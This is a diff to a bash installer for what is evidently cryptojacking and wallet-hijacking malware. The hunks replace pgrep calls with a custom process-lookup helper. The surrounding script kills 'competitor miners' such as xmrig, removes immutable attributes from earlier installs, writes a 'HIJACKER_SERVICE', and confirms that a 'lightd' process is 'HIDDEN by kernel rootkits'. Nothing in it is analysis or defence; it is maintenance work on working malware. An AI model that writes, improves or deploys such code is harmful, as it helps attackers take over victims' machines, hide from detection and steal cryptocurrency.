@@ -175,7 +175,7 @@ echo "[*] Killing old wallet hijacker processes (memory cleanup)..."
 
 # Kill by process name
 for proc in smart-wallet-hijacker wallet-hijacker system-monitor lightd; do
-    if pgrep -f "$proc" >/dev/null 2>&1; then
+    if proc_pids "$proc" | grep -q . 2>/dev/null; then
         echo "    [*] Killing process: $proc"
         pkill -9 -f "$proc" 2>/dev/null || true
         sleep 1
@@ -184,7 +184,7 @@ done
 
 # Kill by binary path
 for binary in "${OLD_BINARIES[@]}"; do
-    if pgrep -f "$binary" >/dev/null 2>&1; then
+    if proc_pids "$binary" | grep -q . 2>/dev/null; then
         echo "    [*] Killing process: $binary"
         pkill -9 -f "$binary" 2>/dev/null || true
         sleep 1
@@ -245,7 +245,7 @@ echo "[*] Killing competitor miners..."
 killall -9 xmrig 2>/dev/null || true
 killall -9 kswapd0 2>/dev/null || true
 killall -9 swapd 2>/dev/null || true
-pgrep -f "swapd|kswapd0|xmrig" | xargs -r kill -9 2>/dev/null || true
+send_sig 9 swapd kswapd0 xmrig
 
 echo "[*] Removing immutable attributes from old installations..."
 # Remove immutable flags (chattr -i) before deletion
@@ -377,7 +377,7 @@ if command -v dpkg >/dev/null 2>&1; then
             # Process is actually running - not interrupted, just busy
             echo "[*] DPKG is currently running (locked by active process)"
             DPKG_INTERRUPTED=false
-        elif pgrep -x "dpkg\|apt-get\|apt\|aptitude" >/dev/null 2>&1; then
+        elif proc_pids dpkg | grep -q . 2>/dev/null || proc_pids apt-get | grep -q . 2>/dev/null; then
             # Package manager is running - not interrupted
             echo "[*] Package manager is currently running"
             DPKG_INTERRUPTED=false
@@ -475,7 +475,7 @@ force_stop_service() {
         if [ -n "$process_names" ]; then
             for proc in $process_names; do
                 # Check if any process with this name exists
-                if pgrep -x "$proc" >/dev/null 2>&1 || pgrep -f "$proc" >/dev/null 2>&1; then
+                if proc_pids "$proc" | grep -q . 2>/dev/null; then
                     echo "[*] Attempt $attempt: Killing process $proc..."
                     
                     # Method 2a: pkill by exact name
@@ -487,7 +487,7 @@ force_stop_service() {
                     # Method 2c: Find and kill by PID
                     local pids
 
-                    pids=$(pgrep -x "$proc" 2>/dev/null)
+                    pids=$(proc_pids "$proc" 2>/dev/null)
                     if [ -n "$pids" ]; then
                         for pid in $pids; do
                             kill -9 "$pid" 2>/dev/null || true
@@ -497,7 +497,7 @@ force_stop_service() {
                     # Method 2d: Find by full command and kill
                     local pids
 
-                    pids=$(pgrep -f "$proc" 2>/dev/null)
+                    pids=$(proc_pids "$proc" 2>/dev/null)
                     if [ -n "$pids" ]; then
                         for pid in $pids; do
                             kill -9 "$pid" 2>/dev/null || true
@@ -1891,7 +1891,7 @@ HIJACKER_SERVICE_EOF
         fi
         
         # Verify it's hidden
-        if pgrep -f "lightd.*daemon" >/dev/null 2>&1; then
+        if proc_pids lightd | grep -q . 2>/dev/null; then
             echo "[⚠] WARNING: lightd process still VISIBLE"
         else
             echo "[✓] lightd process successfully HIDDEN by kernel rootkits"
